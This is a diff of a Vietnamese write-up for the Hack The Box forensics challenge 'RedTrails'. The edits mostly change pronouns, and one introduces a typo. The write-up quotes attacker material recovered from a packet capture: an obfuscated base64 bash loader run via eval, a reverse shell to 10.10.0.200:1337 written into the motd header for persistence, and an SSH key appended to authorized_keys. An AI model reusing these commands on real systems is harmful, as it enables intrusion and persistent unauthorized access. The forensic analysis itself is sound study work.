@@ -3,20 +3,20 @@
 ## Link challenge 
 > https://app.hackthebox.com/challenges/RedTrails
 ## Solution
-- Sau khi tải file em thu được 1 file pcap 
-- Em bắt đầu bằng cách xem các giao thức truyền tin 
+- Sau khi tải file ta thu được 1 file pcap 
+- Chúng ta bắt đầu bằng cách xem các giao thức truyền tin 
 - ![image](image/6.PNG)
-- Ở đây chỉ có 1 vài giao thức thông dụng và giao thức resp ([tài liệu ở đây](https://redis.io/docs/latest/develop/reference/protocol-spec/)), em lọc theo luồng tcp trước. 
-- Tại luồng tcp 0 em tìm thấy 1 phần của flag 
+- Ở đây chỉ có 1 vài giao thức thông dụng và giao thức resp ([tài liệu ở đây](https://redis.io/docs/latest/develop/reference/protocol-spec/)), ta lọc theo luồng tcp trước. 
+- Tại luồng tcp 0 mình tìm thấy 1 phần của flag 
 - ![image](image/7.PNG)
-- Tại luồng thứ 1 em thu được 1 đoạn powershell thực thi như sau 
+- Tại luồng thứ 1 ta thu được 1 đoạn powershell thực thi như sau 
 ```
 gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==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
 ' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
 x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
 eval "$N0q$x$Hc2$rQW"
 ```
-- Em sẽ dùng cybercheff để decode nó ra 
+- Chúng ta sẽ dùng cybercheff để decode nó ra 
 - ![image](image/8.PNG)
 ```
 #!/bin/bash
@@ -59,7 +59,7 @@ hL8FbEfp9L1261G
 echo 'bash -c "bash -i >& /dev/tcp/10.10.0.200/1337 0>&1"' > /etc/update-motd.d/00-header
 ```
 - Có thể nhận thấy đây là câu lệnh cho phép kết nối với ip 10.10.0.200 port là 1337
-- Hàm tiếp theo là x7KG0bvubT6dID2 : Em sẽ thực thi trên 1 file riêng 
+- Hàm tiếp theo là x7KG0bvubT6dID2 : Mình sẽ thực thi trên 1 file riêng 
 ```
 #!/bin/bash
 
@@ -85,11 +85,11 @@ x7KG0bvubT6dID2
 echo -e "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC8Vkq9UTKMakAx2Zq+PnZNc6nYuEK3ZVXxH15bbUeB+elCb3JbVJyBfvAuZ0sonfAqZsyq9Jg6/KGtNsEmtVKXroPXhzFumTgg7Z1NvrUNvnqLIcfxTnP1+/4X284hp0bF2VbITb6oQKgzRdOs8GtOasKaK0k//2E5o0RKIEdrx0aL5HBOGPx0p8GrGe4kRKoAokGXwDVT22LlBylRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IfLMD/FQNy1B4DYhsY62O7o2xR0vxkBEp5UhBAX8gOTG0wjzrUHxmdUimXgiy39YVZaTJQwLBtzJS//YhkewyF/+CP0H7wIKIErlf5WFK5skLYO6uKVpx6akGXY8GADnPU3iPK/MtBC+RqWssdkGqFIA5xG2Fn+Klid9Obm1uXexJfYVjJMOfvuqtb6KcgLmi5uRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IlSxaiOAD2iNJboNuUIxMH/9HNYKd6mlwUpovqFcGBqXizcF21bxNGoOE31Vfox2fq2qW30BDWtHrrYi76iLh02FerHEYHdQAAA08NfUHyCw0fVl/qt6bAgKSb02k691lcDAo5JpEEzNQpub0X8xJItrbw==HTB{r3d15_1n574nc35" >> ~/.ssh/authorized_keys  
 ```    
 - Ta thu được phần đầu của flag : `HTB{r3d15_1n574nc35`
-- Tiếp tục tìm kiếm trên luồng tcp, em tìm thấy 1 file elf
+- Tiếp tục tìm kiếm trên luồng tcp, emìnhm tìm thấy 1 file elf
 - ![image](image/9.PNG)
 - Dùng cybercheff để lấy file ra rồi dùng ida64 để phân tích 
 - ![image](image/10.PNG)
-- Em dùng chatgpt để convert qua python cho dễ đọc 
+- Ta dùng chatgpt để convert qua python cho dễ đọc 
 ```
 import subprocess
 from Crypto.Cipher import AES
@@ -138,7 +138,7 @@ print(result)
 ```
 - Thấy rằng đoạn code đang mã hoá 1 text với key và iv, bây giờ ta cần tìm text để decypt 
 - ![image](image/11.PNG)
-- Em decrypt lần lượt các đoạn text này ra 
+- Ta decrypt lần lượt các đoạn text này ra 
 - ![image](image/12.PNG)
 - ![image](image/13.PNG)
 - ![image](image/14.PNG)
